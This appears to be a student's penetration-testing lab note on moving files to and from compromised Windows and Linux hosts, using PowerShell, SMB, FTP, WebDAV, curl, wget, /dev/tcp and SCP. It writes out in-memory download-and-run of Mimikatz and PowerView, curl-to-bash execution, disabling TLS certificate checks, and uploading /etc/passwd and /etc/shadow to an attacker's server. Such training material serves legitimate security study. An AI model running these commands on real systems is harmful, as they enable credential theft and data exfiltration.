# File Transfers
- [Windows File Transfer Methods](#windows-file-transfer-methods)
    - [Download Operations](#download-operations)
        - [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode)
        - [PowerShell Web Downloads](#powershell-web-downloads)
        - [SMB Downloads](#smb-downloads)
        - [FTP Downloads](#ftp-downloads)
    - [Upload Operations](#upload-operations)
        - [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode-1)
        - [PowerShell Web Uploads](#powershell-web-uploads)
        - [SMB Uploads](#smb-uploads)
        - [FTP Uploads](#ftp-uploads)
- [Linux File Transfer Methods](#linux-file-transfer-methods)
    - [Download Operations](#download-operations)
        - [Base64 Encoding / Decoding](#base64-encoding--decoding)
        - [Web Downloads with Wget and cURL](#web-downloads-with-wget-and-curl)
        - [Download with Bash (/dev/tcp)](#download-with-bash-devtcp)
        - [SCP Downloads](#scp-downloads)
    - [Upload Operations](#upload-operations)
        - [Web Upload](#web-upload)
        - [SCP Upload](#scp-upload)
- [Transferring Files with Code](#transferring-files-with-code)











## Windows File Transfer Methods
### Download Operations
#### PowerShell Base64 Encode & Decode
- **Steps**
    1. Encode the file using base64 util in our attack box `cat id_rsa |base64 -w 0;echo`
    2. We can use md5sum, a program that calculates and verifies 128-bit MD5 checksums: `md5sum id_rsa`
    3. Then, decode using powershell 
    ```
    PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("BASE64_VALUE"))
    ```
    4. Use `Get-FileHash` to ensure that file transferred successfully.

> [!NOTE]
> While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.


#### PowerShell Web Downloads

- PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:

|Method	 |   Description   |
|:-------|:----------------|
|OpenRead|	Returns the data from a resource as a Stream.|
|OpenReadAsync|	Returns the data from a resource without blocking the calling thread.|
|DownloadData|	Downloads data from a resource and returns a Byte array.|
|DownloadDataAsync|	Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|DownloadFile|	Downloads data from a resource to a local file.|
|DownloadFileAsync|	Downloads data from a resource to a local file without blocking the calling thread.|
|DownloadString|	Downloads a String from a resource and returns a String.|
|DownloadStringAsync|	Downloads a String from a resource without blocking the calling thread.|

##### PowerShell DownloadFile Method
1. First Approach
    - File Download
    ```
    PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
    PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

    PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
    PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
    ```

2. Second Approach

    - PowerShell DownloadString - Fileless Method
        - PowerShell can be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.
    ```
    PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

    ```

    > [!NOTE] IEX also accepts pipeline input. 

    ```
    PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
    ```

3. Third Approach

    - From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available.
    ```
    PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
    ```
##### Common Errors with PowerShell
1. There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`
```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
2. Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
#### SMB Downloads

- We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.
- **Steps**
    1. Create the SMB Server `sudo impacket-smbserver share -smb2support /tmp/smbshare`
    2. Copy a File from the SMB Server `C:\htb> copy \\ATTACKING_BOX\share\nc.exe`

- New versions of Windows block unauthenticated guest access, as we can see in the following command: 
```
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```
- To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine: 
    1. Create the SMB Server with username and password `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
    2. Mount the SMB Server with Username and Password `net use n: \\ATTACKING_BOX\share /user:test test`

> [!NOTE]
> You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.

#### FTP Downloads

- We can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. Installing the FTP Server Python3 Module - pyftpdlib: `sudo pip3 install pyftpdlib`

> [!NOTE]
> We can specify port number 21 because, by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.
- **Steps**
    1. Setting up a Python3 FTP Server: `sudo python3 -m pyftpdlib --port 21`
    2. After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell Net.WebClient: `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`

> [!TIP]
> When we get a shell on a remote machine, we may not have an interactive shell. 
> If that's the case, we can create an FTP command file to download a file. 
> First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
> Create a Command File for the FTP Client and Download the Target File:
> ```
> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
> C:\htb> echo USER anonymous >> ftpcommand.txt
> C:\htb> echo binary >> ftpcommand.txt
> C:\htb> echo GET file.txt >> ftpcommand.txt
> C:\htb> echo bye >> ftpcommand.txt
> C:\htb> ftp -v -n -s:ftpcommand.txt
> ftp> open 192.168.49.128
> Log in with USER and PASS first.
> ftp> USER anonymous
> 
> ftp> GET file.txt
> ftp> bye
> 
> C:\htb>more file.txt
> This is a test file
> ```

### Upload Operations
#### PowerShell Base64 Encode & Decode
- **Steps**
    1. Encode the file using powershell then ensure whether it's transferred successfully
    ```
    PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

    IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
    PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

    Hash
    ----
    3688374325B992DEF12793500307566D
    ```
    2. Decode on our attacking box 
    ```
    abdeonix@htb[/htb]$ echo ENCODED_VALUE | base64 -d > hosts
    ```
    - Ensure Integrity `md5sum hosts`



#### PowerShell Web Uploads
1. First Approach
    - PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads.
    - For our web server, we can use uploadserver, an extended module of the Python HTTP.server module, which includes a file upload page.
    - **Steps**
        1. Installing a Configured WebServer with Upload: `sudo pip3 install uploadserver`
        2. Then, start the server `python3 -m uploadserver`
        3. We can use a PowerShell script PSUpload.ps1 which uses `Invoke-RestMethod` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file.
        4. PowerShell Script to Upload a File to Python Upload Server
        ```
        PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
        PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

        [+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
        [+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
        ```
2. Second Approach **(PowerShell Base64 Web Upload)**
    - **Steps**
        - Using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request.
        1. Listen on our attack box `nc -lvnp 8000`
        2. Copy the output and use the base64 decode function to convert the base64 string into a file.
        ```
        PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
        PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
        ```

#### SMB Uploads
- Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks.
- An alternative is to run SMB over HTTP with WebDav
- The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.
- When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP

- **Steps**
    1. Our attacking box:
        - Configuring WebDav Server: `sudo pip3 install wsgidav cheroot`
        - Setup the server: `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`
    2. Target:
        - Connecting to the Webdav Share: `dir \\192.168.49.128\sharefolder`
        - Upload file `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\`


#### FTP Uploads

- **Steps**
    1. Our attacking box:
        - Setup the server: `sudo python3 -m pyftpdlib --port 21 --write`
    2. Target:
        - Powershell upload file: `PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`

> [!TIP]
> We can create a Command File for the FTP Client to Upload a File If we have not interactive shell
> ```
> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
> C:\htb> echo USER anonymous >> ftpcommand.txt
> C:\htb> echo binary >> ftpcommand.txt
> C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
> C:\htb> echo bye >> ftpcommand.txt
> C:\htb> ftp -v -n -s:ftpcommand.txt
> ftp> open 192.168.49.128
> 
> Log in with USER and PASS first.
> 
> 
> ftp> USER anonymous
> ftp> PUT c:\windows\system32\drivers\etc\hosts
> ftp> bye
> ```

## Linux File Transfer Methods
### Download Operations
#### Base64 Encoding / Decoding

- **Steps**
    1. Check file md5 hash `md5sum file`
    2. Encode file to base64 `cat file |base64 -w 0;echo`
    3. Copy this content, paste it onto our Linux target machine, and use base64 with the option `-d` to decode it: `echo -n 'BASE64_VALUE' | base64 -d > file`
    4. Confirm the md5 hash `md5sum file`


> [!NOTE]
> You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.

#### Web Downloads with Wget and cURL

- Download using wget: `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`
- Download using curl: `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`

- **Fileless Attacks Using Linux**
    - Fileless Download with cURL: `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`
    - Fileless Download with wget: `wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`

#### Download with Bash (/dev/tcp)
- As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

- **Steps**
    1. Connect to the Target Webserver: `exec 3<>/dev/tcp/10.10.10.32/80`
    2. HTTP GET request: `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`
    3. Print the Response: `cat <&3`


#### SCP Downloads
- SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol.
- Downloading files using scp `scp plaintext@OUR_ATTACKING_BOX_IP:/root/myroot.txt . `


### Upload Operations
#### Web Upload

- **Steps**
    1. Pwnbox:
        1. Install the uploadserver module. `sudo python3 -m pip install --user uploadserver`
        2. Create a Self-Signed Certificate `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
        3. Start Web Server `mkdir https && cd https` `sudo python3 -m uploadserver 443 --server-certificate ~/server.pem`
    2. Target host:
        1. Upload Multiple Files `curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`

> [!NOTE]
> We used the option `--insecure` because we used a self-signed certificate that we trust.



- **Alternative Web File Transfer Method**
    - Since Linux distributions usually have Python or php installed, starting a web server on compromised machine to transfer files is straightforward.
    - **Steps**
        1. Creating Web server with different languages
            - Creating a Web Server with Python3 `python3 -m http.server`
            - Creating a Web Server with Python2.7 `python2.7 -m SimpleHTTPServer`
            - Creating a Web Server with PHP `php -S 0.0.0.0:8000`
            - Creating a Web Server with Ruby `ruby -run -ehttpd . -p8000`
        2. Download the File from the Target Machine onto the Pwnbox
            - `wget TARGET_IP:8000/filetotransfer.txt`


#### SCP Upload

- `scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/`


## Transferring Files with Code
